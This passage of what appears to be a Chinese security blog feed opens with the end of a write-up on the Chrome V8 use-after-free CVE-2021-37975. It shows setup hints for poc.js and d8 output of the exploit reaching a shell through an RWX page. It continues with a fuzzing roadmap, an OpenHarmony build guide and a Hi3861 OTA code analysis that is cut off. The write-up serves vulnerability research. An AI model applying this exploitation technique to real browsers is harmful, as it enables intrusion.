<p>0x0c8308203ae1 取低32位0x8203ae1， 赋值给poc.js里面的mapAddr 即可。取低32位，是因为v8采用了地址压缩技术，64位地址在变量中只保存低32位，高32位在寄存中保留。 # POC可以简单通过test1.js 来获取double arr的地址; exp实际利用环境，可以通过此UAF漏洞构造任意地址读来获取double arr的地址。 方法不再赘述。<br>由于涉及到堆喷，可能需要运行多次才能获取到shell，获取到shell效果如下：</p>
<figure class="highlight shell"><figcaption><span>showLineNumbers</span></figcaption><table><tr><td class="code"><pre><span class="line">base ❯ ./d8 poc.js</span><br><span class="line">================ double in free zone: larr</span><br><span class="line">===========before access free pointet 1</span><br><span class="line">===========before access free pointet 2</span><br><span class="line">===========before findLArr</span><br><span class="line">fetch failed</span><br><span class="line">================ double in free zone: larr</span><br><span class="line">===========before access free pointet 1</span><br><span class="line">===========before access free pointet 2</span><br><span class="line">fetch failed</span><br><span class="line">================ double in free zone: larr</span><br><span class="line">===========before access free pointet 1</span><br><span class="line">===========before access free pointet 2</span><br><span class="line">===========before findLArr</span><br><span class="line">===========after findLArr</span><br><span class="line">================ double in free zone: instance</span><br><span class="line">================found instance address: 0x81d4189 at index: 0</span><br><span class="line">================found instance address2: 0x81d4189 at index: 0</span><br><span class="line">found instance object at: 7 index: 0</span><br><span class="line">found instance object at: 7 index: 1</span><br><span class="line">================ obj</span><br><span class="line">array address: 0x84239e9</span><br><span class="line">array element address: 0x8423a09</span><br><span class="line">rwx address at: 0x270db670a000</span><br><span class="line">shellArray addr: 0x8423c11</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span></span></span><br><span class="line">args.gn                           d8                       mksnapshot         test.js</span><br><span class="line">build.ninja                       gen                      obj                toolchain.ninja</span><br><span class="line">build.ninja.d                     gen-regexp-special-case  poc.js             torque</span><br><span class="line">bytecode_builtins_list_generator  icudtl.dat               snapshot_blob.bin  v8_build_config.json</span><br><span class="line"><span class="meta prompt_">$</span></span><br></pre></td></tr></table></figure>



<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul>
<li><a href="https://www.freebuf.com/vuls/400324.html">[原创]chrome v8漏洞CVE-2021-37975浅析</a></li>
</ul>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
  </entry>
  <entry>
    <title>Fuzz学习</title>
    <url>/posts/5496c29c.html</url>
    <content><![CDATA[<p>正式开始Fuzz的学习之路，大概总结了一下，大概学习路线如下：</p>
<h2 id="源码Fuzz"><a href="#源码Fuzz" class="headerlink" title="源码Fuzz"></a>源码Fuzz</h2><ul>
<li><input disabled="" type="checkbox"> <a href="2025-08-02-gcc&clang%E7%AD%89%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93.md">gcc&amp;clang等编译工具总结</a></li>
<li><input checked="" disabled="" type="checkbox"> <a href="http://clang.llvm.org/docs/AddressSanitizer.html">ASAN</a>, <a href="https://clang.llvm.org/docs/UndefinedBehaviorSanitizer.html">UBSAN</a>, <a href="https://clang.llvm.org/docs/LeakSanitizer.html">LSan</a>，<a href="https://bbs.kanxue.com/thread-267084.htm">QASAN</a></li>
<li><input disabled="" type="checkbox"> <a href="https://github.com/AFLplusplus/AFLplusplus?tab=readme-ov-file">AFL++</a></li>
<li><input disabled="" type="checkbox"> HonggFuzz</li>
<li><input checked="" disabled="" type="checkbox"> <a href="2025-08-02-LibFuzzer%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.md">LibFuzzer学习笔记</a></li>
<li><input checked="" disabled="" type="checkbox"> <a href="2025-08-02-LibAFL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.md">LibAFL学习笔记</a></li>
<li><input checked="" disabled="" type="checkbox"> <a href="">源码覆盖率统计</a></li>
</ul>
<h2 id="二进制Fuzz"><a href="#二进制Fuzz" class="headerlink" title="二进制Fuzz"></a>二进制Fuzz</h2><ul>
<li><input disabled="" type="checkbox"> afl-qemu</li>
<li><input disabled="" type="checkbox"> FirmAFL</li>
<li><input checked="" disabled="" type="checkbox"> GreenHouse</li>
<li><input disabled="" type="checkbox"> LibAFL-qemu</li>
<li><input disabled="" type="checkbox"> TFuzz（加了符号执行，去除sanity check）</li>
</ul>
<h3 id="黑盒Fuzz"><a href="#黑盒Fuzz" class="headerlink" title="黑盒Fuzz"></a>黑盒Fuzz</h3><ul>
<li><input disabled="" type="checkbox"> Labrador</li>
<li><input disabled="" type="checkbox"> EAGLEYE（接口识别）</li>
</ul>
<h2 id="V8Fuzz"><a href="#V8Fuzz" class="headerlink" title="V8Fuzz"></a>V8Fuzz</h2><ul>
<li><input disabled="" type="checkbox"> Fuzzilli</li>
</ul>
<h2 id="内核Fuzz"><a href="#内核Fuzz" class="headerlink" title="内核Fuzz"></a>内核Fuzz</h2><ul>
<li><input disabled="" type="checkbox"> Syzkaller ：sequence of syscalls</li>
<li><input disabled="" type="checkbox"> TriforceLinuxSyscallFuzzer</li>
<li><input disabled="" type="checkbox"> Unicorefuzz</li>
<li><input disabled="" type="checkbox"> KAFL</li>
<li><input disabled="" type="checkbox"> EQUAFL</li>
<li><input disabled="" type="checkbox"> Pandawan</li>
</ul>
<h2 id="Hypervisor"><a href="#Hypervisor" class="headerlink" title="Hypervisor"></a>Hypervisor</h2><ul>
<li><input disabled="" type="checkbox"> Nyx</li>
</ul>
<h2 id="Android-Fuzz"><a href="#Android-Fuzz" class="headerlink" title="Android Fuzz"></a>Android Fuzz</h2><h2 id="竞态条件"><a href="#竞态条件" class="headerlink" title="竞态条件"></a>竞态条件</h2><ul>
<li><input disabled="" type="checkbox"> BananaFzz</li>
<li>secodefuzz</li>
</ul>
<p><a href="https://googleprojectzero.blogspot.com/2024/06/project-naptime.html">https://googleprojectzero.blogspot.com/2024/06/project-naptime.html</a><br><a href="https://googleprojectzero.blogspot.com/2024/10/from-naptime-to-big-sleep.html#bigsleepteam">https://googleprojectzero.blogspot.com/2024/10/from-naptime-to-big-sleep.html#bigsleepteam</a></p>
]]></content>
      <categories>
        <category>Fuzz</category>
      </categories>
  </entry>
  <entry>
    <title>OpenHarmony编译</title>
    <url>/posts/1deca8a8.html</url>
    <content><![CDATA[<p>学习一波,之前搞过hi3861开发板的oh源码编译，不过那个是轻量系统liteos-m，看看全量编译是什么情况。</p>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><ul>
<li>Ubuntu 20.04虚拟机</li>
<li>已配置gitee ssh公钥</li>
<li>sudo dpkg-reconfigure dash切换shell为bash</li>
</ul>
<h2 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get update; sudo apt-get install binutils; sudo apt-get install binutils-dev; sudo apt-get install git; sudo apt-get install git-lfs; sudo apt-get install gnupg; sudo apt-get install flex; sudo apt-get install bison; sudo apt-get install gperf; sudo apt-get install build-essential; sudo apt-get install zip; sudo apt-get install curl; sudo apt-get install zlib1g-dev; sudo apt-get install gcc-multilib; sudo apt-get install g++-multilib; sudo apt-get install libc6-dev-i386; sudo apt-get install libc6-dev-amd64; sudo apt-get install lib32ncurses5-dev; sudo apt-get install x11proto-core-dev; sudo apt-get install libx11-dev; sudo apt-get install lib32z1-dev; sudo apt-get install ccache; sudo apt-get install libgl1-mesa-dev; sudo apt-get install libxml2-utils; sudo apt-get install xsltproc; sudo apt-get install unzip; sudo apt-get install m4; sudo apt-get install bc; sudo apt-get install gnutls-bin; sudo apt-get install python3.9; sudo apt-get install python3-pip; sudo apt-get install ruby; sudo apt-get install genext2fs; sudo apt-get install device-tree-compilersudo apt-get install make; sudo apt-get install libffi-dev; sudo apt-get install e2fsprogs; sudo apt-get install pkg-config; sudo apt-get install perl; sudo apt-get install openssl; sudo apt-get install libssl-dev; sudo apt-get install libelf-dev; sudo apt-get install libdwarf-dev; sudo apt-get install u-boot-tools; sudo apt-get install mtd-utils; sudo apt-get install cpio; sudo apt-get install doxygen; sudo apt-get install liblz4-tool; sudo apt-get install openjdk-8-jre; sudo apt-get install gcc; sudo apt-get install g++; sudo apt-get install texinfo; sudo apt-get install dosfstools; sudo apt-get install mtools; sudo apt-get install default-jre; sudo apt-get install default-jdk; sudo apt-get install libncurses5; sudo apt-get install apt-utils; sudo apt-get install wget; sudo apt-get install scons; sudo apt-get install python3.9-distutils; sudo apt-get install tar; sudo apt-get install rsync; sudo apt-get install git-core; sudo apt-get install libxml2-dev; sudo apt-get install lib32z-dev; sudo apt-get install grsync; sudo apt-get install xxd; sudo apt-get install libglib2.0-dev; sudo apt-get install libpixman-1-dev; sudo apt-get install kmod; sudo apt-get install jfsutils; sudo apt-get install reiserfsprogs; sudo apt-get install xfsprogs; sudo apt-get install squashfs-tools; sudo apt-get install pcmciautils; sudo apt-get install quota; sudo apt-get install ppp; sudo apt-get install libtinfo-dev; sudo apt-get install libtinfo5; sudo apt-get install libncurses5-dev; sudo apt-get install libncursesw5; sudo apt-get install libstdc++6; sudo apt-get install gcc-arm-none-eabi; sudo apt-get install vim; sudo apt-get install ssh; sudo apt-get install locales; sudo apt-get install libxinerama-dev; sudo apt-get install libxcursor-dev; sudo apt-get install libxrandr-dev; sudo apt-get install libxi-dev</span><br></pre></td></tr></table></figure>

<h2 id="获取源码"><a href="#获取源码" class="headerlink" title="获取源码"></a>获取源码</h2><p>安装repo工具</p>
<figure class="highlight shell"><figcaption><span>showLineNumbers</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取repo工具</span></span><br><span class="line">mkdir ~/bin</span><br><span class="line">curl https://gitee.com/oschina/repo/raw/fork_flow/repo-py3 -o ~/bin/repo </span><br><span class="line">chmod a+x ~/bin/repo</span><br><span class="line">pip3 install -i https://repo.huaweicloud.com/repository/pypi/simple requests</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加到环境变量</span></span><br><span class="line">vim ~/.bashrc               # 编辑环境变量</span><br><span class="line">export PATH=~/bin:$PATH     # 在环境变量的最后添加一行repo路径信息</span><br><span class="line">source ~/.bashrc            # 应用环境变量</span><br></pre></td></tr></table></figure>
<p>OpenHarmony主干代码获取：</p>
<figure class="highlight shell"><figcaption><span>showLineNumbers</span></figcaption><table><tr><td class="code"><pre><span class="line">repo init -u git@gitee.com:openharmony/manifest.git -b master --no-repo-verify</span><br><span class="line">repo sync -c</span><br><span class="line">repo forall -c &#x27;git lfs pull&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>执行prebuilts：在源码根目录下执行prebuilts脚本，安装编译器以及二进制工具：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bash build/prebuilts_download.sh</span><br></pre></td></tr></table></figure>
<h2 id="编译源码"><a href="#编译源码" class="headerlink" title="编译源码"></a>编译源码</h2><h3 id="安装编译工具"><a href="#安装编译工具" class="headerlink" title="安装编译工具"></a>安装编译工具</h3><p>想要详细了解OpenHarmony编译构建模块功能的开发者可参考<a href="https://docs.openharmony.cn/pages/v5.1/zh-cn/device-dev/subsystems/subsys-build-all.md">编译构建指南</a>。</p>
<h4 id="安装hb"><a href="#安装hb" class="headerlink" title="安装hb"></a>安装hb</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 -m pip install --user build/hb</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>设置环境变量，将hb加入到环境变量中<br>卸载命令：<code>python3 -m pip uninstall ohos-build</code></p>
<h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p>进入源码目录执行以下命令进行编译:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置编译路径</span></span><br><span class="line">hb set</span><br><span class="line">.</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在hihope下选择rk3568并回车</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果是64位系统，则需要添加命令</span></span><br><span class="line">hb build --target-cpu arm64</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">执行编译</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">单独编译一个部件（例如hello， `hb build -T 目标名称）</span></span><br><span class="line">hb build -T &lt;Target_Name&gt;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">增量编译整个产品，可以使用`hb build`</span></span><br><span class="line">hb build</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">完整编译整个产品，可以使用`hb build -f`</span></span><br><span class="line">hb build -f</span><br></pre></td></tr></table></figure>
<p>或者直接运行build.sh进行编译</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./build.sh --product-name &#123;product_name&#125; --ccache --target-cpu arm64</span><br></pre></td></tr></table></figure>
<p>编译成功如下图所示，输出结果在<code>//out/&#123;product_name&#125;/</code>目录下：</p>
<img src="/posts/1deca8a8/file-20250804000325725.png" class="">
<h3 id="编译模块"><a href="#编译模块" class="headerlink" title="编译模块"></a>编译模块</h3><p>主要有两种编译方式，<a href="https://docs.openharmony.cn/pages/v5.1/zh-cn/device-dev/subsystems/subsys-build-all.md#%E7%BC%96%E8%AF%91%E5%91%BD%E4%BB%A4">命令行方式和hb方式</a>，这里以命令行方式为例。<br>模块可以使用“–build-target 模块名”单独编译，模块名可以在部件目录下的bundle.json里查看sub_component字段，例如drviers_peripheral_codec部件内容中sub_component字段定义了目标名：<code>hdf_media_codec</code></p>
<figure class="highlight json"><figcaption><span>showLineNumbers</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;@ohos/drivers_peripheral_codec&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;codec device driver&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;4.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;license&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Apache License 2.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;publishAs&quot;</span><span class="punctuation">:</span> <span class="string">&quot;code-segment&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;segment&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;destPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;drivers/peripheral/codec&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;dirs&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;component&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;drivers_peripheral_codec&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;subsystem&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hdf&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;features&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">      <span class="string">&quot;drivers_peripheral_codec_feature_support_omx_extend_test&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="string">&quot;drivers_peripheral_codec_feature_set_omx_role&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="string">&quot;drivers_peripheral_codec_feature_support_hdi_v1&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="string">&quot;drivers_peripheral_codec_feature_support_high_work_frequency&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="string">&quot;drivers_peripheral_codec_feature_support_dma_buffer&quot;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;syscap&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;adapted_system_type&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;standard&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;rom&quot;</span><span class="punctuation">:</span> <span class="string">&quot;675KB&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ram&quot;</span><span class="punctuation">:</span> <span class="string">&quot;7400KB&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;deps&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;components&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;bounds_checking_function&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;c_utils&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;drivers_interface_codec&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;drivers_interface_display&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;drivers_peripheral_display&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;graphic_surface&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;hdf_core&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;hitrace&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;hilog&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;ipc&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;openmax&quot;</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;third_party&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;build&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;sub_component&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;//drivers/peripheral/codec:hdf_media_codec&quot;</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;test&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;//drivers/peripheral/codec/test:hdf_test_media_codec&quot;</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;inner_kits&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;//drivers/peripheral/codec/hal:libcodec_hdi_omx_client&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;header&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">              <span class="attr">&quot;header_files&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;codec_callback_if.h&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;codec_component_if.h&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;codec_component_manager.h&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;codec_component_type.h&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;codec_omx_ext.h&quot;</span></span><br><span class="line">              <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">&quot;header_base&quot;</span><span class="punctuation">:</span> <span class="string">&quot;//drivers/peripheral/codec/interfaces/include&quot;</span></span><br><span class="line">          <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>编译命令如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./build.sh --build-target 模块名</span><br></pre></td></tr></table></figure>

<p>也可以编译相应产品，以编译hispark_taurus_standard为例，编译命令如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./build.sh --product-name hispark_taurus_standard --build-target 模块名 --ccache</span><br></pre></td></tr></table></figure>

<p>还可以编译模块所在的部件：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./build.sh --product-name hispark_taurus_standard --build-target musl --build-target 模块名 --ccache</span><br></pre></td></tr></table></figure>
<h3 id="编译模糊测试用例"><a href="#编译模糊测试用例" class="headerlink" title="编译模糊测试用例"></a>编译模糊测试用例</h3><p>参考: <a href="https://gitee.com/openharmony/testfwk_developer_test/blob/master/libs/fuzzlib/README_zh.md">https://gitee.com/openharmony/testfwk_developer_test/blob/master/libs/fuzzlib/README_zh.md</a><br>可能需要对实际设备进行fuzz？</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a href="https://docs.openharmony.cn/pages/v5.1/zh-cn/device-dev/quick-start/quickstart-pkg-install-package.md">OpenHarmony基于命令行开发指南</a></li>
<li><a href="https://gitee.com/openharmony/testfwk_developer_test/blob/master/libs/fuzzlib/README_zh.md"> 测试框架Fuzzing安全测试指导</a></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>Hi3861 OTA功能介绍</title>
    <url>/posts/ffc31d88.html</url>
    <content><![CDATA[<h1 id="StashRecvDataToBuffer函数功能分析"><a href="#StashRecvDataToBuffer函数功能分析" class="headerlink" title="StashRecvDataToBuffer函数功能分析"></a>StashRecvDataToBuffer函数功能分析</h1><h2 id="函数功能概述"><a href="#函数功能概述" class="headerlink" title="函数功能概述"></a>函数功能概述</h2><p><code>StashRecvDataToBuffer</code>函数是OTA升级过程中的核心数据存储函数，负责将接收到的升级数据缓存到内存或写入到存储设备的HAL层。</p>
<h3 id="函数签名"><a href="#函数签名" class="headerlink" title="函数签名"></a>函数签名</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">StashRecvDataToBuffer</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *buffer, <span class="type">unsigned</span> <span class="type">int</span> startAddr, <span class="type">unsigned</span> <span class="type">int</span> endAddr)</span></span><br></pre></td></tr></table></figure>

<h3 id="参数说明"><a href="#参数说明" class="headerlink" title="参数说明"></a>参数说明</h3><ul>
<li><code>buffer</code>: 要存储的数据缓冲区</li>
<li><code>startAddr</code>: 数据的起始地址（相对于当前组件的偏移）</li>
<li><code>endAddr</code>: 数据的结束地址（相对于当前组件的偏移）</li>
</ul>
<h2 id="函数执行流程"><a href="#函数执行流程" class="headerlink" title="函数执行流程"></a>函数执行流程</h2><h3 id="1-信息组件处理分支"><a href="#1-信息组件处理分支" class="headerlink" title="1. 信息组件处理分支"></a>1. 信息组件处理分支</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (g_currentDloadComp.isInfoComp) &#123;</span><br><span class="line">    <span class="keyword">if</span> (CopyToDloadCompBuffer(buffer, (endAddr - startAddr)) != OHOS_SUCCESS) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;StashRecvDataToBuffer HotaHalWrite failed,\r\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> OHOS_FAILURE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>功能</strong>: 当前下载的是信息组件时，将数据复制到内存缓冲区<code>g_infoCompBuff</code>中。<br><strong>用途</strong>: 信息组件包含升级包的元数据，需要先完整接收并验证后才能处理其他组件。</p>
<h3 id="2-非信息组件处理分支"><a href="#2-非信息组件处理分支" class="headerlink" title="2. 非信息组件处理分支"></a>2. 非信息组件处理分支</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="type">int</span> partition = PARTITION_ERROR;</span><br><span class="line">    GetCurrentDloadCompPartition(&amp;partition);</span><br><span class="line">    <span class="keyword">if</span> (HotaHalWrite(partition, buffer, startAddr - g_currentDloadComp.offset,</span><br><span class="line">        endAddr - startAddr) != OHOS_SUCCESS) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;StashRecvDataToBuffer HotaHalWrite failed, partition = %d .\r\n&quot;</span>, partition);</span><br><span class="line">        ReportErrorCode(HOTA_DATA_WRITE_ERR);</span><br><span class="line">        UpdateStatus(HOTA_FAILED);</span><br><span class="line">        <span class="keyword">return</span> OHOS_FAILURE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// calc Hash</span></span><br><span class="line">    HotaHashCalc(buffer, endAddr - startAddr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>功能</strong>: </p>
<ol>
<li>获取当前组件对应的分区ID</li>
<li>调用HAL层写入函数将数据写入对应分区</li>
<li>计算数据的哈希值用于后续验证</li>
</ol>
<h3 id="3-状态更新"><a href="#3-状态更新" class="headerlink" title="3. 状态更新"></a>3. 状态更新</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">g_currentDloadComp.remainSize -= (endAddr - startAddr);</span><br><span class="line">g_currentDloadComp.currentSize += (endAddr - startAddr);</span><br></pre></td></tr></table></figure>
<p><strong>功能</strong>: 更新当前组件的下载进度信息。</p>
<h2 id="Partition可选项分析"><a href="#Partition可选项分析" class="headerlink" title="Partition可选项分析"></a>Partition可选项分析</h2><h3 id="基于Hi3861平台的Partition定义"><a href="#基于Hi3861平台的Partition定义" class="headerlink" title="基于Hi3861平台的Partition定义"></a>基于Hi3861平台的Partition定义</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    PARTITION_PASS_THROUGH = <span class="number">0</span>,    <span class="comment">// 透传分区</span></span><br><span class="line">    PARTITION_BOOTLOADER = <span class="number">2</span>,      <span class="comment">// Bootloader分区</span></span><br><span class="line">    PARTITION_KERNEL_A = <span class="number">3</span>,        <span class="comment">// 内核A分区</span></span><br><span class="line">    PARTITION_KERNEL_B = <span class="number">4</span>,        <span class="comment">// 内核B分区</span></span><br><span class="line">    PARTITION_ROOTFS = <span class="number">5</span>,          <span class="comment">// 根文件系统分区</span></span><br><span class="line">    PARTITION_APP = <span class="number">6</span>,             <span class="comment">// 应用程序分区</span></span><br><span class="line">    PARTITION_DATA = <span class="number">7</span>,            <span class="comment">// 数据分区</span></span><br><span class="line">    PARTITION_OTA_TAG = <span class="number">8</span>,         <span class="comment">// OTA标签分区</span></span><br><span class="line">    PARTITION_OTA_CONFIG = <span class="number">9</span>,      <span class="comment">// OTA配置分区</span></span><br><span class="line">    PARTITION_ROOTFS_EXT4 = <span class="number">10</span>,    <span class="comment">// EXT4根文件系统分区</span></span><br><span class="line">    PARTITION_MAX</span><br><span class="line">&#125; HotaPartition;</span><br></pre></td></tr></table></figure>

<h3 id="特殊分区定义"><a href="#特殊分区定义" class="headerlink" title="特殊分区定义"></a>特殊分区定义</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PARTITION_ERROR         -1     <span class="comment">// 错误分区</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PARTITION_INFO_COMP     1      <span class="comment">// 信息组件分区</span></span></span><br></pre></td></tr></table></figure>
<h3 id="分区组件映射表"><a href="#分区组件映射表" class="headerlink" title="分区组件映射表"></a>分区组件映射表</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> ComponentTableInfo g_componentTable[] = &#123;</span><br><span class="line">    &#123; PARTITION_PASS_THROUGH, <span class="string">&quot;&quot;</span>, <span class="string">&quot;/sdcard/update/ota_pkg_pass_through.bin&quot;</span>, <span class="number">0</span>&#125;,</span><br><span class="line">    &#123; PARTITION_INFO_COMP, <span class="string">&quot;&quot;</span>, <span class="string">&quot;/sdcard/update/infocomp.bin&quot;</span>, <span class="number">0</span>&#125;,</span><br><span class="line">    &#123; PARTITION_BOOTLOADER, <span class="string">&quot;bootloader&quot;</span>, <span class="string">&quot;/sdcard/update/u-boot.bin&quot;</span>, <span class="number">0</span>&#125;,</span><br><span class="line">    &#123; PARTITION_KERNEL_A, <span class="string">&quot;kernel_A&quot;</span>, <span class="string">&quot;/sdcard/update/kernel.bin&quot;</span>, <span class="number">0</span>&#125;,</span><br><span class="line">    &#123; PARTITION_KERNEL_B, <span class="string">&quot;kernel_B&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="number">0</span>&#125;,</span><br><span class="line">    &#123; PARTITION_ROOTFS, <span class="string">&quot;rootfs&quot;</span>, <span class="string">&quot;/sdcard/update/rootfs.img&quot;</span>, <span class="number">0</span>&#125;,</span><br><span class="line">    &#123; PARTITION_APP, <span class="string">&quot;app&quot;</span>, <span 